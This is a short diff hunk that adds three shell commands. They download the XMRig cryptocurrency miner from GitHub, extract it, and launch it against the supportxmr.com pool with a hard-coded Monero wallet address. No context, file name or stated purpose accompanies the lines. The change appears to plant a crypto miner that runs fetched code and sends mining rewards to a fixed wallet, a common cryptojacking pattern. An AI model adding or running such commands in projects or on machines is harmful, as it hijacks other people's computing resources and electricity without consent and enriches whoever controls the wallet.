@@ -1,0 +1,3 @@
+wget https://github.com/xmrig/xmrig/releases/download/v6.26.0/xmrig-6.26.0-linux-static-x64.tar.gz
+tar -xvzf xmrig-6.26.0-linux-static-x64.tar.gz
+./xmrig -o pool.supportxmr.com:443 -u 83gNrY6ZQEES9RzsQVJYxQBAGPoHtY7EWdKYXpQGHBRxDXEmhD3PWTLLMMmip2jrqCPi3MaR1bfHji3KXzHYxzhz5qD62g9 -k --tls -p hello
